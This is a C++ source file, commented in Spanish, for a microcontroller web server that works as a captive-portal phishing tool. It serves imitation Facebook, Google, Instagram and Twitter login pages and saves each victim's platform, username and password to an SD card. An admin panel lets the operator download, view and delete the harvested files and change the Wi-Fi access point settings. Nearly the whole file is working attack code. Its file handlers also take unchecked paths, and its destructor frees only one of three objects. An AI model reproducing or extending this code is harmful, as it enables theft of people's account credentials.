#ifndef WEB_SERVER_HANDLER_CPP
#define WEB_SERVER_HANDLER_CPP

#include "WebServerHandler.h"


WebServerManager::WebServerManager()
: m_server(nullptr), m_dnsServer(nullptr), m_sdManager(nullptr)
{
}


WebServerManager::WebServerManager(SDCardManager *sd, uint8_t port)
    : m_server(new WebServer(&port)), m_dnsServer(new DNSServer()), m_sdManager(sd)
{
}


WebServerManager::~WebServerManager()
{
    delete m_server,
           m_dnsServer,
           m_sdManager;
}


String WebServerManager::getContentType(const String &filename)
{
    if (filename.endsWith(".html"))
        return "text/html";
    else if (filename.endsWith(".htm"))
        return "text/html";
    else if (filename.endsWith(".css"))
        return "text/css";
    else if (filename.endsWith(".js"))
        return "application/javascript";
    else if (filename.endsWith(".png"))
        return "image/png";
    else if (filename.endsWith(".jpg"))
        return "image/jpeg";
    else if (filename.endsWith(".gif"))
        return "image/gif";
    else if (filename.endsWith(".svg"))
        return "image/svg+xml";
    else if (filename.endsWith(".ico"))
        return "image/x-icon";
    else if (filename.endsWith(".txt"))
        return "text/plain";
    else if (filename.endsWith(".json"))
        return "application/json";
    else if (filename.endsWith(".xml"))
        return "text/xml";
    else if (filename.endsWith(".pdf"))
        return "application/pdf";
    else if (filename.endsWith(".zip"))
        return "application/zip";

    return "application/octet-stream";
}


void WebServerManager::handleSubmitCredentials(void)
{
    String passPhrase = m_server->arg("password");
    passPhrase.replace("\r", "");
    passPhrase.replace("\n", "");
    String credentials = "{\n\t\"platform\": \"" + m_server->arg("platform") + "\",\n";
    credentials.concat("\t\"user-id\": \"" + m_server->arg("username") +"\",\n");
    credentials.concat("\t\"password\": \"" + passPhrase+ "\"\n},");

    // guarda las entradas en un archivo
    if (!saveToDataFile(credentials))
    {
        m_sdManager->logEvent("Error al guardar las credenciales:\n" + credentials);
#if (WITH_ERROR_TYPE)
        Serial.println(ERROR_SAVE_CREDENTIALS);
#endif
        return m_server->send(417, "text/plain", "");
    }

#if (SERVER_SCREEN_LOGS)
        // se imprime por consola los valores de las entradas
        Serial.println(NEW_CREDENTIALS);
#endif 
    m_sdManager->logEvent("Credenciales recibidas correctamente:\n" + credentials);
    // se envia una respuesta al cliente
    m_server->send(201, "text/plain", "");
}


void WebServerManager::handleAdminPanel(void)
{
    if (validateAdminCredentials(m_server->arg("username"), m_server->arg("password")))
    {
        Serial.println(NEW_ADMIN_LOGIN);
        return refreshAdminPage();
    }
    else
    {
        m_server->send(401, "text/plain", "Accesso denegado");
        Serial.println(FAILED_ADMIN_LOGIN);
    }
}


void WebServerManager::handleLoginPages(void)
{
    String platform = m_server->arg("platform");
    String content;
    if     (m_facebook.indexOf(platform) > -1)
        content = m_sdManager->readFile(m_facebook);
    else if(m_google.indexOf(platform) > -1)
        content = m_sdManager->readFile(m_google);
    else if(m_instagram.indexOf(platform) > -1)
        content = m_sdManager->readFile(m_instagram);
    else if(m_twitter.indexOf(platform) > -1)
        content = m_sdManager->readFile(m_twitter);
    else
        m_server->send(404, "text/plain", "page not found");

    Serial.printf(NEW_PAGE_REQ, platform.c_str());
    m_server->send(200, "text/html", content);
}


void WebServerManager::handlePageIcons(void)
{
    if (!m_server->hasArg("icon-name"))
        return m_server->send(400, "text/plain", "");
        
    String iconPath = "/webpages/icons/" + m_server->arg("icon-name");

        if(!m_sdManager->getFileSystem().exists(iconPath))
    {
#if (WITH_ERROR_TYPE)
        Serial.printf(ERROR_NO_FILE, iconPath);
#endif
        return m_server->send(404, "text/plain", "File doens't exist");
    }

    File file = m_sdManager->getFileSystem().open(iconPath);

    if(!file)
    {
#if (WITH_ERROR_TYPE)
        Serial.printf(ERROR_FILE_OPEN, iconPath.c_str());
#endif
        return m_server->send(404, "text/plain", "File not found");
    }

    String fileName = file.name();
    size_t fileSize = file.size();

    Serial.printf("Enviando %u bytes...\n", fileSize);

    m_server->sendHeader("Content-Type","image/png");
    m_server->sendHeader("Content-Length", String(fileSize));
    m_server->sendHeader("Cache-Control", "max-age=31536000");
    m_server->setContentLength(fileSize);
    m_server->streamFile(file, "application/octet-stream");
    
    file.close();
}


void WebServerManager::handleFileDownload(void)
{
    if(!m_server->hasArg("file-path"))
        return m_server->send(400, "text/plain", "ninguna ruta indicada");

    String path = m_server->arg("file-path");

    if(!m_sdManager->getFileSystem().exists(path))
    {
#if (WITH_ERROR_TYPE)
        Serial.println(ERROR_NO_FILE);
#endif
        return m_server->send(404, "text/plain", "El archivo no existe");
    }

    File* file = new File(m_sdManager->getFileSystem().open(path));

    if(!*file)
    {
#if (WITH_ERROR_TYPE)
        Serial.println(ERROR_FILE_OPEN);
#endif
        return m_server->send(401, "text/plain", "error al abrir el archivo");       
    }

    String fileName(file->name());
    m_server->sendHeader("Content-Type", getContentType(fileName));
    m_server->sendHeader("Content-Disposition", "attachment; filename="+fileName);
    m_server->sendHeader("Connection", "close");
    m_server->streamFile(*file, "application/octet-stream");

    file->close();
    m_sdManager->logEvent("Archivo " + String(file->name()) + " descargado por el cliente");
    delete file;
}

void WebServerManager::handleFileUpload(const HTTPUpload& upload)
{
    File *uploadFile = nullptr;

    if(upload.status == UPLOAD_FILE_START)
    {
        String filename = upload.filename;
        Serial.println("Argumento de nombre: " + m_server->arg("uploadfile-name"));
        if (filename.indexOf("/") < 0)
            filename = "/uploads/" + filename;
        else if(!filename.startsWith("/"))
            filename = "/" + filename;
 
        m_sdManager->createDir(SDCardManager::getFileDir(filename));
        m_sdManager->logEvent("Empieza la carga del archivo " + filename);
        Serial.printf(UPLOAD_STARTED, filename.c_str());

        m_sdManager->deleteFile(filename);
        uploadFile = new File(m_sdManager->getFileSystem().open(filename, FILE_WRITE));
    }
    else if (upload.status == UPLOAD_FILE_WRITE)
    {
        if (uploadFile !=  nullptr)
            uploadFile->write(upload.buf, upload.currentSize);
    }
    else if (upload.status == UPLOAD_FILE_END)
    {

        if (uploadFile !=  nullptr)
        {
            uploadFile->close();
            m_sdManager->logEvent("Archivo subido al servidor: " + upload.filename);
            Serial.printf(NEW_FILE_UPLOADED, upload.filename.c_str());

            m_server->send(200, "text/plain", "Archivo subido correctamente");
            refreshAdminPage();
        }
        else
        {
            m_sdManager->logEvent("Error al subir el archivo " + upload.filename);
            Serial.printf(FAILED_FILE_UPLOAD, upload.filename.c_str());

            m_server->send(500, "text/plain", "Carga de archivo fallado");
        }
    }
    else
    {
        m_server->send(500, "text/plain", "No se ha podido crear el archivo");
        Serial.println(FAILED_UNEXPECTED);
    }

    delete uploadFile;
}


void WebServerManager::handleFileDisplay(void)
{
    if(!m_server->hasArg("file-path"))
        return m_server->send(400, "text/plain", "ninguna ruta indicada");

    String path = m_server->arg("file-path");

    if(!m_sdManager->getFileSystem().exists(path))
    {
#if (WITH_ERROR_TYPE)
        Serial.printf(ERROR_NO_FILE, path.c_str());
#endif
        return m_server->send(404, "text/plain", "El archivo no existe");
    }

    String content = m_sdManager->readFile(path);

    if(content=="\0")
    {
#if (WITH_ERROR_TYPE)
        Serial.printf(ERROR_FILE_OPEN, path.c_str());
#endif
        return m_server->send(401, "text/plain", "error al abrir el archivo");
    }
    
    Serial.printf(NEW_FILE_CONTENT, path.c_str());
    m_server->send(200, "text/plain", content);
}


void WebServerManager::handleFileDelete(void)
{
    if(!m_server->hasArg("file-path"))
        return m_server->send(400, "text/plain", "ninguna ruta indicada");

    String path = m_server->arg("file-path");

    if(!m_sdManager->getFileSystem().exists(path))
    {
#if (WITH_ERROR_TYPE)
        Serial.println(ERROR_NO_FILE);
#endif
        return m_server->send(404, "text/plain", "El archivo no existe");
    }

    if(!m_sdManager->deleteFile(path))
    {
#if (WITH_ERROR_TYPE)
        Serial.println(ERROR_FILE_OPEN);
#endif
        m_server->send(401, "text/plain", "error al abrir el archivo");
    }
    else
        m_server->send(204, "text/plain", "");

    m_sdManager->logEvent("Archivo borrado: " + path);
    Serial.printf(NEW_FILE_DELETED, path.c_str());
    return refreshAdminPage();
}


void WebServerManager::handleWiFiConfig(void)
{
    if (!m_server->hasArg("wifi-ssid"))
        return m_server->send(400, "text/plain", "Ningun dato proporcionado");

    String newSSID     = m_server->arg("wifi-ssid");
    String newPassword = m_server->arg("wifi-password");
    String newHostName = m_server->arg("deviceName");

    // Validate input
    if (newSSID.length() >= 3 && newPassword.length() >= 8)
    {
        if(!newHostName==NULL)
            WiFi.hostname(newHostName);

        if (WiFiCaptiveManager::setWifiStation(newSSID, newPassword))
        {
            m_server->send(200, "text/plain", "WiFi Configuration Updated");
            m_sdManager->logEvent("Configuración wifi cambiada:\n\tNuevo SSID: "+ newSSID +
                                    "\n\tNuevo contraseña: "+ newPassword);
            Serial.println(NEW_WIFI_CONFIG);
            return refreshAdminPage();
        }
        else
            m_server->send(400, "text/plain", "Configuración invalida");
    }
    else
        m_server->send(400, "text/plain", "ERROR: tamaño de las entradas incorrecto");
    
}

void WebServerManager::handlePagesPath(void)
{
    m_facebook  = m_server->arg("facebook-html");
    m_google    = m_server->arg("google-html");
    m_instagram = m_server->arg("instagram-html");
    m_twitter   = m_server->arg("twitter-html");
    String pagesFolder = SDCardManager::getFileDir(m_facebook);

    if(!m_sdManager->getFileSystem().exists(pagesFolder))
        m_sdManager->createDir(pagesFolder);

    m_sdManager->logEvent("Cambio de rutas de archvivos:\n\tfacebook: " + m_facebook +
                            "\n\tgoogle: " + m_google +
                            "\n\tinstagram: " + m_instagram +
                            "\n\ttwitter: "   + m_twitter);
    Serial.println(NEW_SOCIALS_PATH);
    return refreshAdminPage();
}


void WebServerManager::handleAccessPoint(void)
{
    if (!m_server->hasArg("ap-ssid"))
        return m_server->send(400, "text/plain", "Ningun dato proporcionado");

    String newSSID     = m_server->arg("ap-ssid");
    String newPassword = m_server->arg("ap-password");

    // Validate input
    if (newSSID.length() >= 1 && newPassword.length() >= 17)
    {
        WiFiCaptiveManager::setAccessPoint(newSSID, newPassword);

        m_sdManager->logEvent("Configuración cambiada");
        Serial.println("Configuración wifi guardada");
        m_server->send(200, "text/plain", "WiFi Configuration Updated");
    }
    else
    {
        m_server->send(400, "text/plain", "Invalid Configuration");
    }
}

void WebServerManager::refreshAdminPage(void)
{
    //generar el archivo con la información del los archivos almacenados en la tarjeta
    generateJSONFile();

    //enviar la info al cliente
    return m_server->send(200, "text/html", getHTMLContent(m_adminPage));
}


bool WebServerManager::saveToDataFile(String data)
{
    String dir = m_sdManager->getFileDir(m_datafile);
    //crear el directorio y el archivo de datos en caso de que no existan
    if (!m_sdManager->getFileSystem().exists(dir))
    {
        if (!m_sdManager->createDir(dir))
            return 0;
    }

    return m_sdManager->appendFile(m_datafile, data) ? 1 : 0;
}


bool WebServerManager::validateAdminCredentials(const String &username, const String &password)
{
    // comprobar si el número de intentos y el tiempo de lockout
    if (_loginAttempts >= MAX_LOGIN_ATTEMPTS &&
        (millis() - _lastAttemptTime) < LOGIN_LOCKOUT_TIME)
    {
        return 0;
    }

    bool validCredentials = (username == ADMIN_USERNAME &&
                             password == ADMIN_PASSWORD);

    if (!validCredentials)
    {
        _loginAttempts++;
        _lastAttemptTime = millis();
        m_sdManager->logEvent("Intento de connexión como admin fallado. Número de intentos: " + String(_loginAttempts));
    }
    else
    {
        m_sdManager->logEvent("Nueva connexión administrador");
        _loginAttempts = 0;
    }

    return validCredentials;
}


void WebServerManager::start(void)
{
    //definir todas las rutas del servidor
    m_server->on("/", HTTP_GET, [this](){
                    String content = m_sdManager->readFile(m_indexPage);
                    m_server->send(200, "text/html", content); });

    m_server->on("/logout", HTTP_POST, [this](){
                    String content = m_sdManager->readFile(m_indexPage);
                    m_server->send(200, "text/html", content); });

    m_server->on("/admin-panel", HTTP_POST, [this]()
                    { handleAdminPanel(); });

    m_server->on("/admin-panel/wifi-configuration", HTTP_POST, [this]()
                    { handleWiFiConfig(); });

    m_server->on("/admin-panel/socials-pages-path", HTTP_POST, [this]()
                    { handlePagesPath(); });
    
    m_server->on("/admin-panel/download", HTTP_POST, [this]()
                    { handleFileDownload(); });

    m_server->on("/admin-panel/upload", HTTP_POST, [this](){m_server->send(200); },[this](){
                    HTTPUpload &upload = m_server->upload();
                    handleFileUpload(upload);
                    
    });
                    //this->handleFileUpload()

    m_server->on("/admin-panel/display", HTTP_GET, [this]()
                    { handleFileDisplay(); });

    m_server->on("/admin-panel/delete", HTTP_POST, [this]()
                    { handleFileDelete(); });

    m_server->on("/admin-panel/admin-app.js", HTTP_GET, [this](){
            String content = m_sdManager->readFile(m_sdManager->getFileDir(m_indexPage)
                                                    + "/admin-app.js");
            m_server->send(200, "application/javascript", content); });

    m_server->on("/admin-panel/data.json", HTTP_GET, [this](){
        String content = m_sdManager->readFile(JSON_FILE_PATH);
        m_server->send(200, "application/json", content); });

    m_server->on("/admin-panel/admin-style.css", HTTP_GET, [this](){
        String content = m_sdManager->readFile(m_sdManager->getFileDir(m_indexPage)
                                                + "/admin-style.css");
        m_server->send(200, "text/css", content); });

    m_server->on("/get-login-page", HTTP_GET, [this]()
                    { handleLoginPages(); });

    m_server->on("/submit-credentials", HTTP_POST, [this]()
                    { handleSubmitCredentials(); });

    m_server->on("/get-page-icons", HTTP_GET, [this]()
                    { handlePageIcons(); });

    //lleva a la pagina de inicio en caso de que sea una ruta desconocida
    m_server->onNotFound([this](){
        m_server->sendHeader("Location", "/");
        m_server->send(302, "text/plain", "redirect to captive portal"); });

    //iniciar el servidor web
    m_server->begin();
#if (WITH_SUCCESS_MESSAGE)
    Serial.println(SUCCESS_SERVER_INIT);
#endif
    delay(2000);
}


void WebServerManager::process(void)
{
    m_dnsServer->processNextRequest();
    m_server->handleClient();
}


void WebServerManager::setPath(const char *path, FileType_t fileType)
{
    switch (fileType)
    {
    case ADMINPAGE:
        m_adminPage = path;
        break;

    case INDEXPAGE:
        m_indexPage = path;
        break;

    case DATAFILE:
        m_datafile = path;
        break;

    case EXITPAGE:
        m_exitPage = path;
        break;
        /*
        case LOGFILE: m_sdManager->setPath(path);
            break;
        */
#if (WITH_ERROR_TYPE)
    default:
        Serial.printf(ERROR_FILE_TYPE, (char *)fileType);
        break;
#endif
    }
}


void WebServerManager::setPath(const String &path, FileType_t fileType)
{
    switch (fileType)
    {
    case ADMINPAGE:
        m_adminPage = path;
        break;

    case INDEXPAGE:
        m_indexPage = path;
        break;

    case DATAFILE:
        m_datafile = path;
        break;

    case EXITPAGE:
        m_exitPage = path;
        break;
        /*
        case LOGFILE: m_sdManager->setPath(path);
            break;
        */
#if (WITH_ERROR_TYPE)
    default:
        Serial.printf(ERROR_FILE_TYPE, (char *)fileType);
        break;
#endif
    }
}


void WebServerManager::setPath(const char *path, Platform_t platform)
{
    String str = path;
    switch (platform)
    {
    case FACEBOOK:
        if (str.indexOf('.') < 0 )
            m_facebook = str + "/index.html";
        else
            m_facebook = path;
        break;

    case GOOGLE:
        if (str.indexOf('.') < 0)
            m_google = str + "/index.html";
        else
            m_google = path;
        break;

    case INSTAGRAM:
        if (str.indexOf('.') < 0)
            m_instagram = str + "/index.html";
        else
            m_instagram = path;
        break;

    case TWITTER:
        if (str.indexOf('.') < 0)
            m_twitter = str + "/index.html";
        else
            m_twitter = path;
        break;
#if (WITH_ERROR_TYPE)
    default:
        Serial.printf(ERROR_FILE_TYPE, (char *)platform);
        break;
#endif
    }
}


void WebServerManager::setPath(const String &path, Platform_t platform)
{
    switch (platform)
    {
    case FACEBOOK:
        if (path.indexOf('.') < 0)
            m_facebook = path + "/index.html";
        else
            m_facebook = path;
        break;

    case GOOGLE:
        if (path.indexOf('.') < 0)
            m_google = path + "/index.html";
        else
            m_google = path;
        break;

    case INSTAGRAM:
        if (path.indexOf('.') < 0)
            m_instagram = path + "/index.html";
        else
            m_instagram = path;
        break;

    case TWITTER:
        if (path.indexOf('.') < 0)
            m_twitter = path + "/index.html";
        else
            m_twitter = path;
        break;
#if (WITH_ERROR_TYPE)
    default:
        Serial.printf(ERROR_FILE_TYPE, (char *)platform);
        break;
#endif
    }
}


String WebServerManager::getHTMLContent(const String &path)
{
    //leer el archivo html fuente
    String *adminContent = new String(m_sdManager->readFile(path));

    //reemplazar los marcadores con la info del punto de acceso
    adminContent->replace(Placeholder_t::AccessPointSSID, WiFi.softAPSSID());
    adminContent->replace(Placeholder_t::ServerIP, WiFi.softAPIP().toString());
    adminContent->replace(Placeholder_t::HostsConected, String(WiFi.softAPgetStationNum()));

    //reemplazar los marcadores con las información actualizada de la tarjeta
    adminContent->replace(Placeholder_t::sdCardType, SDCardManager::getCardType(
                        m_sdManager->getFileSystem().cardType()));
    adminContent->replace(Placeholder_t::sdSize, getReadableSize(
                        m_sdManager->getFileSystem().cardSize()));
    adminContent->replace(Placeholder_t::sdSpaceUsed, getReadableSize(
                        m_sdManager->getFileSystem().usedBytes()));
    adminContent->replace(Placeholder_t::sdFreeSpace, getReadableSize(
                        m_sdManager->getFileSystem().totalBytes()));

    //reemplazar los marcadores con las rutas de las paginas html
    adminContent->replace(Placeholder_t::FacebookPath, m_facebook);
    adminContent->replace(Placeholder_t::GooglePath, m_google);
    adminContent->replace(Placeholder_t::InstagramPath, m_instagram);
    adminContent->replace(Placeholder_t::TwitterPath, m_twitter);
    
    //reemplazar los marcadores con la información de la red wifi
    if (WiFi.status() == WL_CONNECTED)
    {
        adminContent->replace(Placeholder_t::WifiSSID, WiFi.SSID());
        adminContent->replace(Placeholder_t::ClientIP, WiFi.localIP().toString());
        adminContent->replace(Placeholder_t::WiFiStrength, String(WiFi.RSSI()));
        adminContent->replace(Placeholder_t::WifiStatus, "Conectado");
    }
    else
    {
        adminContent->replace(Placeholder_t::WifiSSID, WiFi.SSID());
        adminContent->replace(Placeholder_t::ClientIP, WiFi.localIP().toString());
        adminContent->replace(Placeholder_t::WiFiStrength, "N/A");
        adminContent->replace(Placeholder_t::WifiStatus, "No Conectado");
    }

    return *adminContent;
}


void WebServerManager::generateJSONFile(const String &dirname, String *fileList)
{
    File root = m_sdManager->getFileSystem().open(dirname);
    if (!root)
        return;

    if (dirname == "/")
        *fileList += "{\n\t\"files\": [\n";

    while (true)
    {
        File entry = root.openNextFile();
        if (!entry)
            break;
        
        while (entry.isDirectory())
        {
            generateJSONFile(entry.path(), fileList);
            entry = root.openNextFile();
        }

        String fileName = entry.name();
        
        if (!(fileName == "\0") || !(fileName == ""))
        {
            *fileList += "\t\t{\n\t\t\t\"name\" : \"" + fileName + "\",\n";
            *fileList += "\t\t\t\"path\" : \"" + String(entry.path()) + "\",\n";
            *fileList += "\t\t\t\"size\" : \"" + getReadableSize(entry.size()) + "\"\n";
            *fileList += "\t\t},\n";
        }
        entry.close();
    }

    if (dirname == "/")
    {
        // Remove last comma and close JSON array
        *fileList = fileList->substring(0, fileList->length() - 2);
        *fileList += "\n\t]\n}";
        
        if (!m_sdManager->writeFile(JSON_FILE_PATH, *fileList))
            Serial.println(ERROR_GENERATE_JSON);
        else
            Serial.println(SUCCESS_GENERATE_JSON);
        delete fileList;
    }
}


/*
void WebServerManager::generateJSONFile(const String &dirname = "/", String *fileList = new String(""))
{
    File root = m_sdManager->getFileSystem().open(dirname);
    if (!root)
        return;

    if (dirname == "/")
        *fileList += "{\n\t\"folders\": [\n";

    File entry = root.openNextFile();
    while (entry.isDirectory())
    {
        generateJSONFile(entry.path(), fileList);
        entry = root.openNextFile();
    }

    String rootName = root.name();
    if (!(rootName == ""))
    {
        *fileList += "\t\t{\n\t\t\t\"name\" : \"";
        *fileList += rootName;
        *fileList += "\",\n\t\t\t\"files\": [\n";
    }

    while (true)
    {
        if (!entry)
            break;
        String fileName = entry.name();

        if (!(fileName == "\0") || !(fileName == ""))
        {
            *fileList += "\t\t\t\t{\n\t\t\t\t\t\"name\" : \"" + fileName + "\",\n";
            *fileList += "\t\t\t\t\t\"path\" : \"" + String(entry.path()) + "\",\n";
            *fileList += "\t\t\t\t\t\"size\" : \"" + String(entry.size()) + "\"\n";
            *fileList += "\t\t\t\t},\n";
        }
        entry.close();
        entry = root.openNextFile();
    }
    // delete entry;
    if (!(rootName == ""))
    {
        if (!(fileList->charAt(fileList->length() - 2) == '['))
            *fileList = fileList->substring(0, fileList->length() - 2);
        *fileList += "\n\t\t\t]\n\t\t},\n";
    }

    if (dirname == "/")
    {
        // Remove last comma and close JSON array
        *fileList = fileList->substring(0, fileList->length() - 2);
        *fileList += "\n\t]\n}";
        
        if (!m_sdManager->writeFile(JSON_FILE_PATH, *fileList))
            Serial.println(ERROR_GENERATE_JSON);
        else
            Serial.println(SUCCESS_GENERATE_JSON);
        delete fileList;
    }
}

*/

#endif // WEB_SERVER_HANDLER_CPP